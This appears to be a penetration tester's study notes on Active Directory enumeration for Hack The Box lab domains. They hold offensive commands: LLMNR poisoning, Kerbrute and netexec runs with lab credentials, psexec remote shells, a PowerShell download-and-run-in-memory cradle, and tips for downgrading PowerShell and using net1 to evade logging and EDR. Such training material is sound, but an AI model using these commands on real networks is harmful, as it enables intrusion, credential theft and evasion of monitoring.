# External Domain Enumeration
We are trying to get the `lay of the land` to ensure we provide the most comprehensive test possible for our customer.

## What Are We Looking For?

| **Data Point**       | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `IP Space`           | Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, ``DNS record entries``, etc.                                                                                                                                                                                                                                                                              |
| `Domain Information` | Based on IP data, DNS, and site registrations.Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)                                                                                                                             |
| `Schema Format`      | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.                                                                                                                                                                      |
| `Data Disclosures`   | For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain `intranet` site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public ``GitHub repo``, the internal AD username format in the metadata of a PDF, for example.) |
| `Breach Data`        | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.                                                                                                                                                                                                                                                                                                                                |
| ``OSINT``            | All publicy accessible datas. We can check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) and [OSINT:Corporate Recon](https://academy.hackthebox.com/course/preview/osint-corporate-recon) modules.                                                                                                                                                                                                             |

## Where Are We Looking?

| **Resource**                     | **Examples**                                                                                                                                                                                                                                                                                                                                                                                                                             |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ASN / IP registrars`            | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)                                                                                                                                                                                                                                                       |
| `Domain Registrars & DNS`        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), [viewdns.info](https://viewdns.info/), manual DNS record (nslookup) requests against the domain in question or against well known DNS servers, such as `8.8.8.8`.                                                                                                                                           |
| `Social Media`                   | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.                                                                                                                                                                                                                                                                                 |
| `Public-Facing Company Websites` | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.                                                                                                                                                                                                                                                       |
| `Cloud & Dev Storage Spaces`     | [Trufflehog](https://github.com/trufflesecurity/truffleHog), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)                                                                                                                                                                                                          |
| `Breach Data Sources`            | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |

## Hunting For Files, E-mails & More w/ Google Dorks

### Google Dork Cheatsheet
```
filetype:pdf inurl:inlanefreight.com
intext:"@inlanefreight.com" inurl:inlanefreight.com
```

| Filter              | Description                                                                         | Example                                                                                                          |
| ------------------- | ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| site:               | Finds results on a specific website or domain.                                      | `site:example.com`                                                                                               |
| inurl:              | Searches for a keyword within a URL.                                                | `inurl:admin`                                                                                                    |
| intitle:            | Finds a keyword within a webpage's title.                                           | `intitle:login page`                                                                                             |
| filetype:           | Locates specific file types like PDF or XLS.                                        | `filetype:pdf budget report`                                                                                     |
| link:               | Finds web pages linking to a specific URL.                                          | `link:example.com`                                                                                               |
| intext:             | Searches for keywords within the body text of a webpage.                            | `intext:security vulnerability`                                                                                  |
| allintitle:         | Finds pages with multiple keywords in the title.                                    | `allintitle:sensitive data`                                                                                      |
| cache:              | Shows the cached version of a webpage.                                              | `cache:example.com`                                                                                              |
| related:            | Displays pages related to a specific URL.                                           | `related:example.com`                                                                                            |
| info:               | Provides details about a website, including cache and similar pages.                | `info:example.com`                                                                                               |
| ext:                | Finds a specific file extension.                                                    | `ext:docx project plan`                                                                                          |
| define:             | Displays the definition of a word or phrase.                                        | `define:cybersecurity`                                                                                           |
| phonebook:          | Searches for phone numbers and contact information for a person or business.        | `phonebook:John Doe`                                                                                             |
| map:                | Shows a map of a location or address.                                               | `map:1600 Amphitheatre Parkway, Mountain View, CA`                                                               |
| allinurl:           | Finds pages with multiple keywords in the URL.                                      | `allinurl:secure login`                                                                                          |
| before:             | Finds content indexed before a specific date.                                       | `before:2020-01-01`                                                                                              |
| after:              | Finds content indexed after a specific date.                                        | `after:2022-01-01`                                                                                               |
| numrange:           | Searches for numbers within a specified range.                                      | `numrange:1000-2000`                                                                                             |
| AROUND(X):          | Finds pages where two terms are within a specified number of words from each other. | `"data science" AROUND(3) "career"`                                                                              |
| inanchor:           | Searches for keywords within the anchor text of links on a webpage.                 | `inanchor:"click here"`                                                                                          |
| safesearch:         | Exclude adult-content                                                               | ``safesearch: sex education``                                                                                    |
|                     |                                                                                     |                                                                                                                  |
| Operator            | Description                                                                         | Example                                                                                                          |
| Search Term         | Searches for the exact phrase within quotation marks. Useful for precise searches.  | `"artificial intelligence"`                                                                                      |
| OR                  | Searches for either of the terms provided.                                          | `site:example.com OR site:example.org`                                                                           |
| AND                 | Searches for both terms provided.                                                   | `site:example.com AND "privacy policy"`                                                                          |
| Combining Operators | Combines multiple operators for complex searches.                                   | `(site:example.com OR site:example.org) AND intext:"login" (site:example.com OR site:example.org) inurl:"login"` |
| Include Results     | Includes results containing the specified keyword.                                  | `+"data analysis"`                                                                                               |
| Exclude Results     | Excludes results containing the specified keyword.                                  | `-"social media"`                                                                                                |
| Synonyms            | Searches for synonyms of the specified keyword.                                     | `~developer`                                                                                                     |
| Glob Pattern (*)    | Acts as a wildcard for unknown terms.                                               | `site:example.*`                                                                                                 |

### Username Harvesting
We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

### Credentials Hunting
[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Can be useful for creating a user list for external or internal password spraying.

## OSINT 
Every other Open Source INTelligence information.



# ============================================



# Internal Domain Enumeration

## Hosts Discovery

### ARP & MDNS
Looking for [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies, [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS), and other basic [layer two](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) packets
```bash
sudo -E wireshark
```

If we've no GUI, we can use [Tshark](https://www.wireshark.org/docs/man-pages/tshark.html) (CLI version of Wireshark). We can save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
```bash
tshark -i ens33
```

We can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](https://www.netminer.com/en/product/netminer.php) to perform the same functions. 
```bash
sudo tcpdump -i ens224
```

[Nmap](https://linux.die.net/man/1/nmap) uses ARP requests if run with a privileged user, unless ``--send-ip`` was specified.
```bash
nmap -sn 10.10.10.0/24
```

From Windows 10, a network monitoring build-in tool `pktmon.exe` can be used. 

### LLMNR, NBT-NS & MDNS
[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses. Analyze mode will passively listen to the network and not send any poisoned packets.
```bash
sudo responder -I ens224 -A 
```

### ICMP
[Fping](https://fping.org/) provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host.
```bash
fping -asgq 10.10.10.0/24
```

We could use bash to do a ping sweep :
```bash
# This will scan for all available hosts in the network, and save all ip addresses that responded to the ping request to the alive_hosts file
for i in $(seq 254); do ping 10.10.10.$i -c1 -W1 & done | grep from | awk '{print $4}' | sed 's/://' | sort -u > alive_hosts
```

[Nmap](https://linux.die.net/man/1/nmap) can also perform a ping sweep.
```bash
nmap -sn 10.10.10.0/24
```

The list of found hosts can then be saved into a ``alive_hosts.txt`` file, and can be scanned using nmap 
```bash
nmap -v -A -T4 -iL alive_hosts.txt
```


## Identifying Users
[Kerbrute](https://github.com/ropnop/kerbrute) can be used for domain account enumeration with `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

We can use the following command to only keep the ``usernames@domain`` : 
```bash
grep -oP '\S+@trilocor.local' valid_ad_users > extracted_users.txt
```

We can look for an `NT AUTHORITY\\SYSTEM` account on a `domain-joined` host, as it will be able to enumerate Active Directory the same way a domain user account would. By gaining ``SYSTEM-level`` access on a domain-joined host, we could :

- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
- Perform Kerberoasting / ASREPRoasting attacks within the same domain.
- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
- Perform token impersonation to hijack a privileged domain user account.
- Carry out ACL attacks.
- Get the list of all domain users account & groups
- And more !



# ============================================



# Credentialed Enumeration from Linux
## Domain User Enumeration
```bash
# List all users
netexec smb 172.16.5.5 -u forend -p Klmcargo2 --users > all_ad_users.txt
# Same if password contain special caracters (coller le password juste après le "-p")
netexec smb 172.16.139.3 -u pthorpe_adm -p'-pl,MKO)9ijn' --users > all_ad_users.txt
# To keep only the users in the list, removing all info that netexec add
awk '{print $5}' all_ad_users.txt > all_ad_users

# Find privileged users 
windapsearch -d 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -m privileged-users
```

## Domain User Enumeration w/ RID
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> queryuser 0x457
# Gather all user's RIDs
rpcclient $> enumdomusers
```

## Domain Group Enumeration
```bash
# List all groups
netexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# List domain admins group members
windapsearch -d 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -m domain-admins
```

## Logged On Users
```bash
netexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

## Share Enumeration Against Domain Controller
```bash
netexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
# The module spider_plus will dig through each readable share on the host and list all readable files.
netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'


smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
# Recursive list of all directories
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

```

## Retrieve a Shell on Domain Host
[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager` ; once established, communication happens over a named pipe, providing an interactive remote shell.
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules.
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## Visualize Attack Paths w/ BloodHound 
```bash
# Start neo4j database
neo4j start

# Bloodhound-python = SharpHound
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local -c all

# The zip files can the gathered into a zip folder
zip -r domain.zip ./ *.json

# Import the zip archive into BloodHound GUI
bloodhound
```

[ShadowHound](https://github.com/Friends-Security/ShadowHound) is a set of PowerShell scripts for Active Directory enumeration without the need for introducing known-malicious binaries like ``SharpHound``. It leverages native PowerShell capabilities to minimize detection risks.



# Credentialed Enumeration from Windows
The [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. 
```bash
# Import ActiveDirectory PowerShell Module
PS C:\htb> Import-Module ActiveDirectory

# Import PowerView.ps1 script
PS C:\htb> Import-Module .\PowerView.ps1
```

## Domain User Enumeration
```bash
# List all users
PS C:\htb> Get-ADUser 

# Filtering users with the ServicePrincipalNames property populated
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Using PowerView.ps1
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Using PowerView.ps1 find users with SPN Set
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## Domain Enumeration
```bash
# Using ActiveDirectory PowerShell Module
PS C:\htb> Get-ADDomain
```

## Domain Group Enumeration
```bash
# Using ActiveDirectory PowerShell Module
PS C:\htb> Get-ADGroup -Filter * | select name

# Details about a specific group
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

# Get a member listing of a group
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

# Using PowerView.ps1
PS C:\htb> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

## Check Domain Trust Relationships
```bash
# Using ActiveDirectory PowerShell Module
PS C:\htb> Get-ADTrust -Filter *

# Using PowerView.ps1
PS C:\htb> Get-DomainTrustMapping

# Using PowerView.ps1 test local admin access
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Another tool worth experimenting with is [SharpView](https://github.com/tevora-threat/SharpView), a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. Here is a PowerView commands cheatsheet :

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

## Share Enumeration 
[Snaffler](https://github.com/SnaffCon/Snaffler) works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. It requires that it be run from a domain-joined host or in a domain-user context.
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## Visualize Attack Paths w/ BloodHound
We must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.
```bash
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

We can exfiltrate the dataset to our attacking machine (prefered) or ingest it into the BloodHound GUI tool on MS01.



# ============================================



# Enumerating Security Controls
## Windows Defender
[Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) by default will block tools such as `PowerView.ps1`. The built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) can be use to get the current Defender status.
```bash
PS C:\htb> Get-MpComputerStatus
```

## AppLocker
[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run
```bash
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## PowerShell Constrained Language Mode
PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
```bash
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
```

## LAPS
The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed using [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
```bash
PS C:\htb> Find-LAPSDelegatedGroups
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
```bash
PS C:\htb> Find-AdmPwdExtendedRights
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
```bash
PS C:\htb> Get-LAPSComputers
```



# ============================================



# Enumeration w/out Tools
More stealthy approach, may not create as many log entries and alerts as pulling tools into the network.
## Basic Host Enum & Network Info

| **Command**                                             | **Result**                                                                                                             |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `hostname`                                              | Prints the PC's Name                                                                                                   |
| ``whoami``                                              | Get the current user                                                                                                   |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                                                           |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                                                    |
| ``systeminfo``                                          | Gives us a quick initial picture of the state the host is in, as well as some basic networking and domain information. |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)                                 |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                                                    |
| ``arp -a``                                              | Lists all known hosts stored in the arp table.                                                                         |
| ``route print``                                         | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.       |
| ``netsh advfirewall show allprofiles``                  | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.                    |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                                               |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)                             |

## PowerShell
| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                     |
| -------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                             |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                               |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | Change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                      |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | Get the specified user's PowerShell history.                                                                                                                                                                                        |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | Download a file from the web using PowerShell and call it from memory.                                                                                                                                                              |
| ``qwinsta``                                                                                                                | See all the current logged-in users on host.                                                                                                                                                                                        |

### Downgrading PowerShell
We can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer.
```bash
# Get PowerShell Version
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320


PS C:\htb> powershell.exe -version 2
PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
```
The action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged.

### Checking Defenses
```bash
# Check if Defender is running
PS C:\htb> netsh advfirewall show allprofiles

# From CMD.exe
C:\htb> sc query windefend

# Check status & config settings of Defender
PS C:\htb> Get-MpComputerStatus
```

## Windows Management Instrumentation (WMI)
[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine widely used to retrieve information and run administrative tasks on local and remote hosts. 
### Quick WMI Checks

| **Command**                                                                                | **Description**                                                                                                                             |
| ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                    | Prints the patch level and description of the Hotfixes applied                                                                              |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`       | Displays basic host information to include any attributes within the list                                                                   |
| `wmic process list /format:list`                                                           | A listing of all processes on host                                                                                                          |
| `wmic ntdomain list /format:list`                                                          | Displays information about the Domain and Domain Controllers                                                                                |
| `wmic useraccount list /format:list`                                                       | Displays information about all local accounts and any domain accounts that have logged into the device                                      |
| `wmic group list /format:list`                                                             | Information about all local groups                                                                                                          |
| `wmic sysaccount list /format:list`                                                        | Dumps information about any system accounts that are being used as service accounts.                                                        |
| ``wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress`` | Quick refenced command to get info about the domain and the child domain, and the external forest that our current domain has a trust with. |
This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

## Net Commands
`net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component.
### Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|
If you believe the network defenders are actively logging/looking for any commands out of the normal, typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

## Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) can be utilized to find Active Directory objects. This is queries used by BloodHound and PowerView. `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed.
Need elevated / `SYSTEM` privileges.
```bash
# User Search
PS C:\htb> dsquery user
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# LDAP combine : search users w/ "PASSWD_NOTREQD" flag set in the "userAccountControl" attribute
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Computer Search
PS C:\htb> dsquery computer

# Look for all Domain Controllers in the current domain, limited to 5
PS C:\htb> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

More about LDAP filtering in the [HTB_AD_Enum](https://academy.hackthebox.com/module/143/section/1360) module, and in the [search filter syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) article.
